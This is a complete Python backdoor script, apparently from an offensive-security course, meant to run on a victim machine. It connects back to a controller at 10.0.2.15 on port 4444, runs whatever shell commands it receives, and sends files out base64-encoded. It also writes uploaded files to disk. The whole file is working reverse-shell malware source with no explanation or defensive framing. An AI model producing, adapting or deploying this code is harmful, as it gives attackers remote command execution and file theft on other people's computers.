#!/usr/bin/env python

# This application needs to run from the target machine

import socket      # a way of connecting two nodes on a network to communicate with each other.
import subprocess  # function for shell commands
import json        # a lightweight data interchange format
import os          # manipulate paths
import base64      # functions for encoding binary data to printable ASCII characters and decoding such encodings back to binary data


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create a socket object
        self.connection.connect((ip, port))                                  # connect to specified ip/port

    # function that sends json objects through socket connection
    def reliable_send(self, data):
        try:
            json_data = json.dumps(data.decode('utf-8')).encode('utf-8')
        except UnicodeDecodeError:
            json_data = json.dumps(str(data)).encode('utf-8')
        except AttributeError:
            json_data = json.dumps(data).encode('utf-8')
        self.connection.send(json_data)

    # function that receives json objects through socket connection
    def reliable_receive(self):
        json_data = "".encode('utf-8')
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except json.decoder.JSONDecodeError:  # if didn't receive the whole package yet, wait
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution."
            self.reliable_send(command_result)



my_backdoor = Backdoor("10.0.2.15", 4444)
my_backdoor.run()